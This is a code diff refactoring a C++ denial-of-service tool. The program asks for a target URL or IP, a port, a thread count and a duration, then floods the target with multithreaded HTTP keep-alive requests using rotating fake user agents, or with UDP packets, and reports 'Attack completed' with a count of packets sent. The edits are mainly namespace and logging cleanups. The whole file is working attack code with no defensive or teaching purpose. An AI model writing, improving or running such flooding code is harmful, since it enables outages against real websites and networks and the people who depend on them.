@@ -15,11 +15,9 @@
 #include <atomic>
 #include <chrono>
 
-using namespace std;
+std::atomic<int> packetsSent{0};
 
-atomic<int> packetsSent{0};
-
-const vector<string> userAgents = {
+const std::vector<std::string> userAgents = {
     "Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
     "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:15.0) like Gecko",
@@ -47,14 +45,14 @@ const vector<string> userAgents = {
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.1.17 (KHTML, like Gecko) Version/7.1 Safari/537.85.10"
 };
 
-string grs(int length) {
-    const string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
-    string result;
+std::string grs(int length) {
+    const std::string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
+    std::string result;
     result.resize(length);
 
-    random_device rd;
-    default_random_engine rng(rd());
-    uniform_int_distribution<int> dist(0, chars.size() - 1);
+    std::random_device rd;
+    std::default_random_engine rng(rd());
+    std::uniform_int_distribution<int> dist(0, chars.size() - 1);
 
     for (int i = 0; i < length; ++i) {
         result[i] = chars[dist(rng)];
@@ -63,10 +61,10 @@ string grs(int length) {
     return result;
 }
 
-int cs_http(const string& remote, int port) {
+int cs_http(const std::string& remote, int port) {
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) {
-        cout << "socket creation failed\n";
+        std::cerr << "socket creation failed\n";
         return -1;
     }
 
@@ -74,14 +72,14 @@ int cs_http(const string& remote, int port) {
     hints.ai_family = AF_INET;
     hints.ai_socktype = SOCK_STREAM;
 
-    if (getaddrinfo(remote.c_str(), to_string(port).c_str(), &hints, &result) != 0) {
-        cout << "getaddrinfo failed\n";
+    if (getaddrinfo(remote.c_str(), std::to_string(port).c_str(), &hints, &result) != 0) {
+        std::cerr << "getaddrinfo failed\n";
         close(sock);
         return -1;
     }
 
     if (connect(sock, result->ai_addr, result->ai_addrlen) < 0) {
-        cout << "connection failed\n";
+        std::cerr << "connection failed\n";
         close(sock);
         freeaddrinfo(result);
         return -1;
@@ -91,17 +89,17 @@ int cs_http(const string& remote, int port) {
     return sock;
 }
 
-void sr_http(int maxRequests, const string& host, int port, int time) {
+void sr_http(int maxRequests, const std::string& host, int port, int time) {
     int sock;
-    string packet;
-    string randSeed = grs(30);
-    string userAgent;
+    std::string packet;
+    std::string randSeed = grs(30);
+    std::string userAgent;
 
-    auto endTime = chrono::steady_clock::now() + chrono::seconds(time);
-    while (chrono::steady_clock::now() < endTime) {
+    auto endTime = std::chrono::steady_clock::now() + std::chrono::seconds(time);
+    while (std::chrono::steady_clock::now() < endTime) {
         sock = cs_http(host, port);
         if (sock < 0) {
-            this_thread::sleep_for(chrono::seconds(1));
+            std::this_thread::sleep_for(std::chrono::seconds(1));
             continue;
         }
 
@@ -113,7 +111,7 @@ void sr_http(int maxRequests, const string& host, int port, int time) {
                      "Accept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n" +
                      "Content-Length: 0\r\nConnection: Keep-Alive\r\n\r\n";
             if (send(sock, packet.c_str(), packet.size(), 0) == -1) {
-               //  std::cout << "send failed\n";
+                // std::cerr << "send failed\n";
             } else {
                 packetsSent++;
             }
@@ -123,14 +121,14 @@ void sr_http(int maxRequests, const string& host, int port, int time) {
     }
 }
 
-void l7_http(const string& url, int port, int maxThreads, int time) {
-    string host = url.substr(url.find("//") + 2);
+void l7_http(const std::string& url, int port, int maxThreads, int time) {
+    std::string host = url.substr(url.find("//") + 2);
 
-    if (size_t pos = host.find('/'); pos != string::npos) {
+    if (size_t pos = host.find('/'); pos != std::string::npos) {
         host = host.substr(0, pos);
     }
 
-    vector<thread> threads;
+    std::vector<std::thread> threads;
     for (int i = 0; i < maxThreads; ++i) {
         threads.emplace_back(sr_http, maxThreads, host, port, time);
     }
@@ -139,8 +137,9 @@ void l7_http(const string& url, int port, int maxThreads, int time) {
         t.join();
     }
 
-    cout << "\nAttack completed.\n"
+    std::cout << "\nAttack completed.\n"
               << "URL: " << url << "\n"
+              << "Port: " << port << "\n"
               << "Threads: " << maxThreads << "\n"
               << "Packets Sent: " << packetsSent.load() << "\n";
 }
@@ -148,31 +147,31 @@ void l7_http(const string& url, int port, int maxThreads, int time) {
 int cs_udp() {
     int sock = socket(AF_INET, SOCK_DGRAM, 0);
     if (sock < 0) {
-        cout << "socket creation failed\n";
+        std::cerr << "socket creation failed\n";
         return -1;
     }
 
     return sock;
 }
 
-void sr_udp(const string& ip, int port, int maxRequests, int time) {
+void sr_udp(const std::string& ip, int port, int maxRequests, int time) {
     int sock;
     struct sockaddr_in serverAddr;
-    string packet;
+    std::string packet;
 
-    memset(&serverAddr, 0, sizeof(serverAddr));
+    std::memset(&serverAddr, 0, sizeof(serverAddr));
     serverAddr.sin_family = AF_INET;
     serverAddr.sin_port = htons(port);
     if (inet_pton(AF_INET, ip.c_str(), &serverAddr.sin_addr) <= 0) {
-        cout << "Invalid IP address\n";
+        std::cerr << "Invalid IP address\n";
         return;
     }
 
-    auto endTime = chrono::steady_clock::now() + chrono::seconds(time);
-    while (chrono::steady_clock::now() < endTime) {
+    auto endTime = std::chrono::steady_clock::now() + std::chrono::seconds(time);
+    while (std::chrono::steady_clock::now() < endTime) {
         sock = cs_udp();
         if (sock < 0) {
-            this_thread::sleep_for(chrono::seconds(1));
+            std::this_thread::sleep_for(std::chrono::seconds(1));
             continue;
         }
 
@@ -181,20 +180,20 @@ void sr_udp(const string& ip, int port, int maxRequests, int time) {
             ssize_t sentBytes = sendto(sock, packet.c_str(), packet.size(), 0,
                                        (struct sockaddr*)&serverAddr, sizeof(serverAddr));
             if (sentBytes == -1) {
-                cout << "sendto failed: " << strerror(errno) << '\n';
+                std::cerr << "sendto failed: " << strerror(errno) << '\n';
             } else {
                 packetsSent++;
             }
         }
 
         close(sock);
-        this_thread::sleep_for(chrono::milliseconds(50)); // Throttle if needed
+        std::this_thread::sleep_for(std::chrono::milliseconds(100)); // Throttle if needed
     }
 }
 
-void udpFlood(const string& ip, int port, int maxThreads, int time) {
+void udpFlood(const std::string& ip, int port, int maxThreads, int time) {
 
-    vector<thread> threads;
+    std::vector<std::thread> threads;
     for (int i = 0; i < maxThreads; ++i) {
         threads.emplace_back(sr_udp, ip, port, maxThreads, time);
     }
@@ -203,54 +202,54 @@ void udpFlood(const string& ip, int port, int maxThreads, int time) {
         t.join();
     }
 
-    cout << "\nAttack completed.\n"
+    std::cout << "\nAttack completed.\n"
               << "IP: " << ip << "\n"
               << "Threads: " << maxThreads << "\n"
               << "Packets Sent: " << packetsSent.load() << "\n";
 }
 
 int main() {
-    srand(static_cast<unsigned>(time(nullptr)));
+    std::srand(static_cast<unsigned>(std::time(nullptr)));
 
-    string choice;
-    cout << "Select attack type (http/udp): ";
-    cin >> choice;
+    std::string choice;
+    std::cout << "Select attack type (http/udp): ";
+    std::cin >> choice;
 
-    auto startTime = chrono::steady_clock::now();
+    auto startTime = std::chrono::steady_clock::now();
 
     if (choice == "http") {
-        string url;
+        std::string url;
         int maxThreads, time, port;
-        cout << "Enter URL: ";
-        cin >> url;
-	cout << "Enter Port: ";
-	cin >> port;
-        cout << "Enter number of threads: ";
-        cin >> maxThreads;
-        cout << "Enter attack duration in seconds: ";
-        cin >> time;
+        std::cout << "Enter URL: ";
+        std::cin >> url;
+        std::cout << "Enter port number: ";
+        std::cin >> port;
+        std::cout << "Enter number of threads: ";
+        std::cin >> maxThreads;
+        std::cout << "Enter attack duration in seconds: ";
+        std::cin >> time;
         l7_http(url, port, maxThreads, time);
     } else if (choice == "udp") {
-        string ip;
+        std::string ip;
         int maxThreads, port, time;
-        cout << "Enter IP address: ";
-        cin >> ip;
-	cout << "Enter Port: ";
-	cin >> port;
-        cout << "Enter number of threads: ";
-        cin >> maxThreads;
-        cout << "Enter attack duration in seconds: ";
-        cin >> time;
+        std::cout << "Enter IP address: ";
+        std::cin >> ip;
+	std::cout << "Enter Port: ";
+	std::cin >> port;
+        std::cout << "Enter number of threads: ";
+        std::cin >> maxThreads;
+        std::cout << "Enter attack duration in seconds: ";
+        std::cin >> time;
         udpFlood(ip, port, maxThreads, time);
     } else {
-        cout << "Invalid choice\n";
+        std::cerr << "Invalid choice\n";
         return 1;
     }
 
-    auto endTime = chrono::steady_clock::now();
-    chrono::duration<double> elapsedSeconds = endTime - startTime;
+    auto endTime = std::chrono::steady_clock::now();
+    std::chrono::duration<double> elapsedSeconds = endTime - startTime;
 
-    cout << "Total Time Elapsed: " << elapsedSeconds.count() << " seconds\n";
+    std::cout << "Total Time Elapsed: " << elapsedSeconds.count() << " seconds\n";
 
     return 0;
 }
